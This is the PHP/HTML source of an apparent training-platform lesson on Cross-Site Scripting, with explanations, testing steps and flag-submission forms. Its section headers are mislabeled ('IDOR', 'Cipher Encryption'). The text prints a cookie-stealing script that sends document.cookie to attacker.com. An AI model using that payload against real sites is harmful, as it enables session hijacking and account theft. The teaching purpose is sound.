<?php
session_start();
include '../../userinfo/connection.php';
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flisk</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
</head>

<body>
    <div class="navbar">
        <div class="logo">
            <a href="../../index.php" style="color: white; text-decoration: none;">
                <span>Flisk</span>
                <span style="color: blue;">JS</span>
            </a>
        </div>
        <div class="auth-buttons">
            <?php if (isset($_SESSION['username'])): ?>
                <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?></span>
                <div class="user-dropdown">
                    <button class="user-icon"><i class="fas fa-user-circle"></i></button>
                    <div class="dropdown-menu">
                        <a href="../../profile.php"><i class="fas fa-user"></i> Profile</a>
                        <a href="../../leaderboard.php"><i class="fas fa-trophy"></i> Leaderboard</a>
                        <a href="../../userinfo/logout.php" class="logout"><i class="fas fa-sign-out-alt"></i> Log Out</a>
                    </div>
                </div>
            <?php else: ?>
                <a href="../../userinfo/login.php"><button>Login</button></a>
                <a href="../../userinfo/register.php"><button>Register</button></a>
            <?php endif; ?>
        </div>
    </div>

    <div class="header">
        <div class="title">IDOR</div>
    </div>
    <div class="task">
        <div class="task-header" onclick="toggleContent('content1')">
            <h3>Explanation</h3>
        </div>
        <div class="task-content" id="content1">
            <strong>What is Cross-Site Scripting (XSS)?</strong>
            <p>Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts
                into a website, which then get executed in the browsers of other users. This happens when a website does
                not properly filter or escape user inputs before displaying them.</p>

            <p>For example, if a website allows users to submit comments and displays them without filtering, an
                attacker could submit a script like:</p>
            <code>&lt;script&gt;alert('Hacked!')&lt;/script&gt;</code>
            <p>If the website includes this comment as-is, any visitor viewing the page would see a popup alert instead
                of a normal comment.</p>

            <strong>What Can XSS Lead To?</strong>
            <ul>
                <li>Stealing user cookies and session data.</li>
                <li>Defacing websites by injecting malicious content.</li>
                <li>Redirecting users to phishing or malicious websites.</li>
                <li>Performing actions on behalf of the victim without their knowledge.</li>
            </ul>

            <p>For example, if an attacker injects a script that sends users’ login tokens to a remote server, they
                could hijack accounts and gain unauthorized access.</p>

            <strong>How to Prevent XSS?</strong>
            <ul>
                <li>Sanitize and escape user input before displaying it on web pages.</li>
                <li>Use Content Security Policy (CSP) to restrict script execution.</li>
                <li>Validate and encode input data to prevent script injections.</li>
                <li>Avoid using `innerHTML` or `document.write()` to handle user-generated content.</li>
            </ul>
        </div>


    </div>

    <div class="task">
        <div class="task-header" onclick="toggleContent('content2')">
            <h3>Cipher Encryption and Decryption</h3>
        </div>

        <div class="task-content" id="content2">
            <strong>How a Cross-Site Scripting (XSS) Attack Works</strong>
            <p>Cross-Site Scripting (XSS) attacks occur when a website does not properly filter or escape user input,
                allowing attackers to inject malicious scripts. These scripts are then executed in the browsers of other
                users, leading to data theft, session hijacking, or defacement of web pages.</p>

            <ul>
                <li><strong>Stealing User Data:</strong> Attackers inject scripts that steal cookies, session tokens, or
                    login credentials.</li>
                <li><strong>Website Defacement:</strong> Injecting scripts that modify the website’s appearance or
                    display misleading content.</li>
                <li><strong>Forcing Actions on Behalf of Users:</strong> Running unauthorized actions in a victim's
                    session, such as posting messages or transferring funds.</li>
            </ul>

            <strong>How to Perform an XSS Attack on the Test Website</strong>
            <p>To test XSS vulnerabilities, follow these steps:</p>

            <ul>
                <li><strong>Find an Input Field:</strong> Look for areas where the website allows users to submit text,
                    such as comments, search bars, or contact forms.</li>
                <li><strong>Inject a Simple Script:</strong> Try entering the following script into an input field and
                    submitting it:</li>
                <code>&lt;script&gt;alert('XSS Test')&lt;/script&gt;</code>
                <li><strong>Observe the Response:</strong> If the website does not properly escape or filter the input,
                    you will see an alert box pop up, confirming an XSS vulnerability.</li>
                <li><strong>Advanced Exploitation:</strong> If the website is vulnerable, an attacker could inject
                    scripts to steal session cookies:</li>
                <code>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
            </ul>

            <strong>Risks of Performing XSS Attacks</strong>
            <p>While testing for XSS vulnerabilities can help improve security, unauthorized exploitation of these flaws
                is illegal and unethical. Risks include:</p>

            <ul>
                <li><strong>Legal Consequences:</strong> Performing attacks on real websites without permission can lead
                    to legal action.</li>
                <li><strong>Data Breaches:</strong> Exploiting XSS on a live website can result in stolen user
                    credentials and financial losses.</li>
                <li><strong>Account Hijacking:</strong> XSS attacks can be used to take control of admin accounts,
                    leading to full site compromise.</li>
                <li><strong>Loss of Reputation:</strong> Companies that fail to secure against XSS may lose customer
                    trust and face fines for data exposure.</li>
            </ul>

            <strong>How to Prevent XSS</strong>
            <p>To protect against XSS attacks, implement the following security measures:</p>
            <ul>
                <li><strong>Sanitize and Escape Input:</strong> Ensure all user input is properly filtered and encoded
                    before being displayed.</li>
                <li><strong>Use Content Security Policy (CSP):</strong> Restrict inline scripts and prevent unauthorized
                    JavaScript execution.</li>
                <li><strong>Validate User Input:</strong> Allow only expected data types and formats in form fields.
                </li>
                <li><strong>Avoid `innerHTML`:</strong> Do not use `innerHTML` or `document.write()` to handle untrusted
                    content.</li>
            </ul>
        </div>


    </div>

    <div class="task">
        <div class="task-header" onclick="toggleContent('content3')">
            <h3>Get Working</h3>
        </div>
        <div class="task-content" id="content3">

            <form id="flagForm" action="flagsub/xsssub.php" method="POST">
                <div class="input-container">
                    <p>What do attacker inject in a web to Cross-Site Script (XSS)?</p>
                    <input type="text" id="userInput" name="flag1" autocomplete="off" placeholder="Type your answer here..." required>
                    <button type="button" id="submitBtn">Submit</button>
                    <p class="result" id="result"></p>
                    <p id="loadingMessage" style="display:none;">Submitting your flag...</p>
                </div>

                <div class="input-container">
                    <p>Click this button to be sent to a dummy website to test your knowledge</p>
                    <a>
                        <button id="vncButton" onclick="window.open('websites/xssweb.php', '_blank')">Click Me</button>
                        <br>
                        <p>Type the black below</p>
                        <input type="text" id="userInput2" name="flag2" autocomplete="off" placeholder="Type your answer here..." required>
                        <button type="button" id="submitBtn2">Submit</button>
                        <p class="result" id="results"></p>
                        <p id="loadingMessage2" style="display:none;">Submitting your flag...</p>
                    </a>
                </div>
            </form>
        </div>
    </div>
    <script>

        function showVncInfo() {
            var button = document.getElementById("vncButton");
            var resultDiv = document.getElementById("vncResult");

            button.style.display = "none";
            resultDiv.style.display = "block";
            resultDiv.innerText = "Loading VNC IP and Port...";

            let dots = 0;
            let interval = setInterval(() => {
                dots = (dots + 1) % 4;
                resultDiv.innerText = "Loading VNC IP and Port" + ".".repeat(dots);
            }, 500);


            setTimeout(() => {
                clearInterval(interval);
                resultDiv.innerText = "VNC IP and Port: 132.145.31.21:5901";
            }, 5000);
        }

        function toggleContent(id) {
            const content = document.getElementById(id);
            content.style.display = content.style.display === 'block' ? 'none' : 'block';
        }

        function submitFlag(inputId, resultId, buttonId, loadingId, flagName) {
            const input = document.getElementById(inputId);
            const result = document.getElementById(resultId);
            const button = document.getElementById(buttonId);
            const loadingMessage = document.getElementById(loadingId);

            result.style.color = 'orange';
            result.textContent = 'Submitting your flag...';
            loadingMessage.style.display = 'inline';

            fetch('flagsub/xsssub.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `${flagName}=${encodeURIComponent(input.value.trim())}`
            })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        result.style.color = 'green';
                        result.textContent = data.message;
                        input.disabled = true;
                        button.disabled = true;
                    } else {
                        result.style.color = 'red';
                        result.textContent = data.message;
                    }
                    loadingMessage.style.display = 'none';
                })
                .catch(error => {
                    console.error('Error:', error);
                    result.style.color = 'red';
                    result.textContent = 'Something went wrong, please try again.';
                    loadingMessage.style.display = 'none';
                });
        }

        document.getElementById('submitBtn').addEventListener('click', function (e) {
            e.preventDefault();
            submitFlag('userInput', 'result', 'submitBtn', 'loadingMessage', 'flag1');
        });

        document.getElementById('submitBtn2').addEventListener('click', function (e) {
            e.preventDefault();
            submitFlag('userInput2', 'results', 'submitBtn2', 'loadingMessage2', 'flag2');
        });

        document.getElementById('submitBtn3').addEventListener('click', function (e) {
            e.preventDefault();
            submitFlag('userInput3', 'result3', 'submitBtn3', 'loadingMessage3', 'flag3');
        });

        document.getElementById('submitBtn4').addEventListener('click', function (e) {
            e.preventDefault();
            submitFlag('userInput4', 'result4', 'submitBtn4', 'loadingMessage4', 'flag4');
        });

    </script>
    <style>
        .header {
            height: 200px;
            background: linear-gradient(to right, #0b1a30, #0d6dd6);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .header .title {
            color: white;
            font-size: 2.5em;
            font-weight: bold;
        }

        .task {
            margin: 20px;
            background-color: rgb(34, 37, 42);
            padding: 15px;
            border-radius: 8px;
        }

        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
        }

        .task-header:hover {
            color: rgb(105, 105, 105);
        }

        .task-content {
            margin-top: 10px;
            display: none;
        }

        .task-content img {
            max-width: 100%;
            border-radius: 8px;
        }

        .input-container {
            margin-top: 10px;

        }

        .input-container input {
            padding: 8px;
            border: 1px solid #94a3b8;
            border-radius: 4px;
            width: 90%;
            color: #1e293b;


        }

        .result {
            margin-top: 10px;
            font-weight: bold;
        }

        input[type="text"],
        {
        margin-bottom: 15px;
        padding: 10px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 4px;
        text-align: center
        }

        button {
            background-color: #007bff;
            border-radius: 10px;
            cursor: pointer;
            border: none;
            padding: 15px 32px;
            float: center;
            margin-top: 10px;
        }

        .auth-buttons {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .auth-buttons button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        .auth-buttons button:hover {
            background-color: #0056b3;
        }

        .user-dropdown {
            position: relative;
            display: inline-block;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            right: 0;
            background-color: #333;
            border-radius: 8px;
            min-width: 150px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
        }

        .dropdown-menu a {
            display: flex;
            align-items: center;
            gap: 8px;
            color: white;
            text-decoration: none;
            padding: 10px;
            transition: background 0.3s;
        }

        .dropdown-menu a:hover {
            background: #444;
        }

        .logout {
            color: red !important;
            font-weight: bold;
        }

        .logout:hover {
            background: darkred;
        }

        .user-icon {
            background: none;
            border: none;
            cursor: pointer;
            color: white;
            font-size: 1.5rem;
        }

        .user-dropdown:hover .dropdown-menu {
            display: block;
        }
    </style>
    </head>

</body>

</html>



<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #1e1e1e;
        color: #f4f4f4;
    }

    .navbar {
        display: flex;
        justify-content: center;
        align-items: center;
        color: #f4f4f4;
        padding: 10px 20px;
        position: relative;
        z-index: 2;
    }

    .navbar .logo {
        font-size: 24px;
        font-weight: bold;
        flex-grow: center;
    }


    .navbar .auth-buttons {
        position: absolute;
        right: 10px;
        display: flex;
        gap: 10px;
    }

    .navbar .auth-buttons button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
    }

    .navbar .auth-buttons button:hover {
        background-color: #0056b3;
    }
</style>

<style>
    .btn {
        padding: 10px 20px;
        background-color: #4CAF50;
        color: white;
        border: none;
        cursor: pointer;
        font-size: 16px;
    }

    .btn:hover {
        background-color: #45a049;
    }

    .result {
        margin-top: 20px;
        font-size: 20px;
        font-weight: bold;
    }
</style>